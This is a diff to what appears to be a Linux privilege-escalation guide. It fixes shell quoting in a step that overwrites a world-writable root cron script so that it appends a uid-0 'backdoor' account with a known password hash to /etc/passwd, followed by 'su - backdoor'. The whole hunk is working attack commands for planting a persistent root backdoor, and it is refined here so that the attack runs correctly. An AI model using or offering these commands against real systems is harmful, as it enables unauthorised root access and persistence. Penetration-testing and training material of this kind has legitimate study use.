@@ -840,9 +840,10 @@ If the world-writable cron script runs as root, overwrite it to append a backdoo
 openssl passwd -1 -salt xyz password
 # example output: $1$xyz$WS9wRpHkHCTG4UNfuHJxN/
 
-# Overwrite the world-writable cron script with the backdoor payload
-# (single-quote the echo to prevent shell from expanding $1 prematurely)
-echo 'echo "backdoor:$1$xyz$WS9wRpHkHCTG4UNfuHJxN/:0:0:root:/root:/bin/bash" >> /etc/passwd' > /path/to/cron_script.sh
+# Overwrite the world-writable cron script with the backdoor payload.
+# Use printf + escaped $ so the written script uses single quotes —
+# without this, cron expands $1/$xyz/$hash as empty variables and corrupts the hash.
+printf "echo 'backdoor:\$1\$xyz\$WS9wRpHkHCTG4UNfuHJxN/:0:0:root:/root:/bin/bash' >> /etc/passwd\n" > /path/to/cron_script.sh
 
 # Wait up to 1 minute for cron to fire, then switch user
 su - backdoor   # password: password
